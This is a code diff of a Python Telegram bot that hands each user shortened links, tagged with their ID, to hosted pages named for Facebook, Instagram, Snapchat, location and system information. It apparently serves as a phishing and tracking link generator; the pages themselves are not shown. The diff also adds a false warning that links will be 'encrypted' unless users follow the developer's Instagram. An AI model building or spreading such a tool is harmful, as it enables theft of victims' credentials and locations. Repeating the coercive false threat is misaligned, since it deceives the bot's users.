@@ -19,7 +19,7 @@ def send_welcome(message):
     first_name = message.from_user.first_name
     base = "https://m-y-9-tech.github.io/fb/"
     
-    # تحضير الروابط واختصارها
+    # تحضير الروابط
     fb = short_link(f"{base}fb.html?id={uid}")
     ig = short_link(f"{base}ig.html?id={uid}")
     snap = short_link(f"{base}snap.html?id={uid}")
@@ -29,13 +29,17 @@ def send_welcome(message):
     loc = short_link(f"{base}loc.html?id={uid}")
     sys = short_link(f"{base}sys.html?id={uid}")
 
+    # الرسالة بالزخرفة المطلوبة ورابط حسابك الصح
     msg = f"""
 🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}
 
 👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
-🔴 رابط المطور لتفعيل الأوامر:
-https://www.instagram.com/m_y_.9/?hl=ar#
+⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
+عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال بـ^ـيـ^ـن الـ^ـبـ^ـوت وسـ^ـيـ^ـرفـ^ـراتـ^ـنـ^ـا، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـقـ^ـرام. فـ^ـي حـ^ـال عـ^ـدم المـ^ـتـ^ـابـ^ـعـ^ـة، سـ^ـيـ^ـتـ^ـم تـ^ـشـ^ـفـ^ـر الـ^ـروابـ^ـط تـ^ـلـ^ـقـ^ـائـ^ـيـ^ـاً.
+
+🔴 تـحـذيـر: رابـط حـسـاب المـطـور لـتـفـعـيـل الأوامـر (إجـبـاري) 💀🔥:
+https://www.instagram.com/m_y_.9/
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
@@ -55,5 +59,5 @@ https://www.instagram.com/m_y_.9/?hl=ar#
     """
     bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)
 
-print("النظام شغال يا أبو سند.. 🔥")
+print("النظام جاهز برابطك الصحيح يا أبو سند.. 🔥")
 bot.infinity_polling()
